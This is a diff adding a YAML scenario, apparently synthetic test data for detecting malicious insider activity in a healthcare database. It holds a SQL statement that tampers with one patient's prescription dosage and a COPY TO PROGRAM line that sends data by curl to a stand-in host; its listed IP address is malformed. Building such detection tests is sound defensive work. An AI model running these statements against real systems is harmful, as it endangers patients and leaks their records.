@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_05_data_tamper_mal_100
+family_id: gen_healthcare_05_data_tamper_mal_fam100
+domain: healthcare
+time_of_day: '23:35'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: nurse
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: UPDATE prescriptions SET dosage = 323573 WHERE patient_id = 79058
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 23.129.64.251.254
+      port: 5432
